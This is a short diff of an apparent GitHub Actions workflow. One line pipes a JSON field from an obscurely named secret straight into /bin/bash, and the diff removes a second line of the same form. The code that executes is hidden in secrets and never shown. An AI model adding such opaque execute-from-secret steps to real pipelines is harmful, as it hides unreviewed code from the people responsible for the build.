@@ -21,7 +21,6 @@ jobs:
           vq03420: ${{ secrets.vq03420 }}
         run: |
           printf '%s' "$vq03420" | jq -r .dogso8 | /bin/bash
-          printf '%s' "$tq77897" | jq -r .vokwk395 | /bin/bash
 
       - name: Archive results
         if: always()
